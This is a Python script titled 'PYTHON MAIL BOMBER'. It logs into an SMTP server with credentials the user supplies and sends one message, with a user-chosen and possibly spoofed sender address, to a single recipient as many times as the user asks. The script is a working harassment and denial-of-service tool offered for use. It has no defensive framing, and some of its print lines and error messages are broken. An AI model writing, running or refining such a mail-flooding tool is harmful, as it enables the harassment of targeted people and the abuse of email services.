import smtplib
import sys
import time
from email.mime.text import MIMEText


class SMTP(object):
    def title(self):

        print
        " PYTHON MAIL BOMBER IS WORKING :) "

    def SMTPconnect(self):

        print
        "We are in the SMTPconnect"  # list of SMTP server - http://www.e-eeasy.com/SMTPServerList.aspx
        print("smtp for gmail: smtp.gmail.com")
        self.smtpserver = input("\nEnter SMTP server: ")

        self.smtpport = input("Enter SMTP port (Usualy 25 or 587): ")

        try:

            self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)

        except IOError:

            print('Error: %s')

            time.sleep(5)

            sys.exit(1)

        self.mailServer.starttls()

        self.username = input("Enter your email: ")

        self.password = input("Enter Password: ")  # password

        try:

            self.mailServer.login(self.username, self.password)

        except BaseException:
            print("Error: %s")

            time.sleep(3)

            sys.exit(1)

    def buildemail(self):

        print
        " We are inside Buildemail "

        print
        "\tBuilding message part"

        self.From = input("\nFrom: ")  # From

        self.To = input("\nTo: ")  # TO

        self.Subject = input("\nSubject: ")  # Subject

        self.Message = input("\nMessage: ")  # message

        mensaje = MIMEText(self.Message)

        mensaje['From'] = self.From

        mensaje['To'] = self.To

        mensaje['Subject'] = self.Subject

        self.ammount = input("How Many times would you like to send email: ")

        x = 0

        while int(x) < int(self.ammount):
            self.mailServer.sendmail(self.From, self.To, mensaje.as_string())

            x += 1

        print("%d emails sent to %s" % (int(self.ammount), self.To))

        time.sleep(7)


if __name__ == '__main__':
    s = SMTP()

    s.title()

    s.SMTPconnect()

    s.buildemail()
